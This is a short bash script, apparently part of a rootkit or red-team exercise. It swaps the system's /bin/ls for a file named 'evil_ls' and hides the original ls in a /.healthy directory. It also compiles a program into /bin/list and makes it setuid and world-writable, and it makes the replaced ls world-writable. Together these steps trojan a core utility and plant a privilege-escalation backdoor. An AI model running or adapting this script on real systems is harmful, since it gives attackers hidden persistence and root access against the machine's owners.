#!/bin/bash

mkdir /.healthy
mv /bin/ls /.healthy/ls
mv Shims/ls/evil_ls /bin/ls
gcc Shims/ls/evil_ls.c -o Shims/ls/list
mv Shims/ls/list /bin/list
chown root:root /bin/ls
chmod 777 /bin/ls
chmod 777 /bin/list
chmod u+s /bin/list
#rm -f Shims
